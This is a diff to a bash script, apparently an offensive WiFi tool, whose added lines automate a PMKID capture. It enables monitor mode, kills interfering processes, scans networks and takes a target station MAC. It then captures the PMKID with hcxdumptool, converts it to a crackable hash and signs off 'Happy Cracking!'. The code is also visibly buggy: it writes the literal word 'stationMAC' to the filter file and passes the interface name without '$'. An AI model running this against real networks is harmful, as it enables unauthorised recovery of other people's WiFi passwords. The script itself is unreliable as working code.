@@ -9,10 +9,24 @@ if [[ $EUID -ne 0 ]]; then
    exit 1
 fi
 
+cd
+
 airmon-ng start $interfaceName
 
 airmon-ng check kill
 
 monInterfaceName=$interfaceName"mon"
 
-airodump-ng $monInterfaceName
+timeout 30s watch airodump-ng $monInterfaceName
+
+read -p "Enter Station MAC address (no colons): " stationMAC
+
+echo stationMAC > filter.txt
+
+hcxdumptool -o hashedPMKID -i monInterfaceName --enable_status=1 --filtermode=2 --filterlist=filter.txt | grep -m 1 "FOUND PMKID CLIENT-LESS"
+
+hcxpcaptool -z finalHash hashedPMKID
+
+cat finalHash
+
+echo "Happy Cracking!"
